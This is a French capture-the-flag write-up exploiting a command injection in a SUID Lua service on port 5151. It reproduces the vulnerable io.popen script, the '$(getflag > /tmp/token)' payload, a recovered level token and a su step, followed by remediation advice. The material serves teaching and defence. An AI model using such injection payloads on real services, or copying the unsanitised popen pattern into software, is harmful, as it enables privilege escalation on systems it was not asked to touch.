# Rapport de Vulnérabilité : Injection de Commande dans un Script Lua SUID

## Description
Cette vulnérabilité exploite un script Lua (`level11.lua`) configuré avec le bit SUID appartenant à l'utilisateur flag11. Le script écoute en local sur le port 5151 et demande un mot de passe. En interne, il passe la saisie utilisateur à la commande `echo ... | sha1sum` via `io.popen()` pour comparer la valeur SHA-1. L'absence de filtrage de l'entrée permet d'injecter des commandes shell via la substitution de commande `$()`. Grâce au bit SUID, ces commandes s'exécutent avec les privilèges de flag11, permettant de récupérer le flag du niveau 11.

## Comment Exploiter la Faille

### Étape 1 : Connexion au service vulnérable
```bash
nc 127.0.0.1 5151
```
**Résultat :**
```
Password: 
```

Le script Lua attend une saisie utilisateur qui sera traitée par la fonction de hachage.

### Étape 2 : Analyse du script vulnérable

**Code complet du script `level11.lua` :**
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end
while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

**Analyse de la vulnérabilité :**
- La fonction `hash(pass)` utilise : `io.popen("echo "..pass.." | sha1sum", "r")`
- Le paramètre `pass` est directement concaténé sans échappement
- Le hash attendu est `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`

**Tentative initiale de déchiffrement :**
Nous avons d'abord tenté de déchiffrer le hash SHA-1 `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` sur des outils comme dcode.fr, mais la réponse obtenue (`nottoeasy`) ne semblait pas être la bonne piste. Nous avons donc orienté notre approche vers l'exploitation de l'injection de commande.

### Étape 3 : Injection de la commande malveillante

**Payload d'injection :**
```bash
$(getflag > /tmp/token)
```

**Mécanisme d'exploitation :**
- Le script exécute : `echo $(getflag > /tmp/token) | sha1sum`
- La substitution `$()` s'exécute en premier avec les privilèges de flag11
- `getflag` récupère le flag et le sauvegarde dans `/tmp/token`
- Le résultat SHA-1 ne correspond pas au mot de passe attendu

**Résultat affiché :**
```
Erf nope..
```

Bien que l'authentification échoue, la commande injectée a été exécutée avec succès.

### Étape 4 : Récupération du flag

```bash
cat /tmp/token
```
**Résultat :**
```
Check flag. Here is your token : fa6v5ateaw21peobuub8ipe6s
```

**Flag obtenu :**
```
fa6v5ateaw21peobuub8ipe6s
```

### Étape 5 : Passage au niveau suivant

```bash
su level12
```
**Mot de passe :**
```
fa6v5ateaw21peobuub8ipe6s
```

---

## Mécanisme détaillé de l'exploitation

### Séquence d'exécution :
1. **Connexion** : `nc 127.0.0.1 5151`
2. **Saisie** : `$(getflag > /tmp/token)`
3. **Exécution Lua** : `io.popen("echo $(getflag > /tmp/token) | sha1sum", "r")`
4. **Substitution shell** : Le shell exécute d'abord `getflag > /tmp/token`
5. **Privilèges** : L'exécution se fait avec les droits de flag11 (SUID)
6. **Résultat** : Le flag est sauvegardé dans `/tmp/token`

### Pourquoi l'exploitation fonctionne :
- **SUID** : Le script s'exécute avec les privilèges de flag11
- **Pas de filtrage** : L'entrée utilisateur est directement passée au shell
- **Substitution de commande** : `$()` permet l'exécution de commandes arbitraires
- **Redirection** : `> /tmp/token` sauvegarde le résultat dans un fichier accessible

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Éliminer l'exécution de commandes shell sur les entrées utilisateur :**
  - Remplacer `io.popen("echo "..pass.." | sha1sum", "r")` par une fonction de hachage native Lua
  - Utiliser une bibliothèque cryptographique dédiée (ex: `luacrypto`)

* **Échappement sécurisé si l'appel shell est nécessaire :**
  - Filtrer rigoureusement les caractères spéciaux : `$`, `` ` ``, `|`, `;`, `&`
  - Utiliser des fonctions d'échappement appropriées

* **Suppression du bit SUID :**
  - Si les privilèges élevés ne sont pas nécessaires, retirer le bit SUID
  - Principe de moindre privilège : n'accorder que les permissions strictement nécessaires

* **Validation stricte des entrées :**
  - Implémenter une liste blanche de caractères autorisés
  - Limiter la longueur des saisies utilisateur

**Code sécurisé suggéré :**
```lua
-- Utilisation d'une bibliothèque de hachage native
local crypto = require("crypto")
local hash = crypto.digest("sha1", pass)

-- Ou échappement sécurisé
local escaped_pass = pass:gsub("[%$%`%|%;%&%(%)%[%]%{%}]", "\\%1")
```

## Conclusion

Cette vulnérabilité démontre les risques critiques liés à l'utilisation de `io.popen()` avec des entrées utilisateur non filtrées dans un contexte SUID. La combinaison de l'injection de commande et des privilèges élevés permet une escalation immédiate des privilèges. L'utilisation de fonctions de hachage natives et la suppression du bit SUID sont essentielles pour sécuriser ce type d'application.

---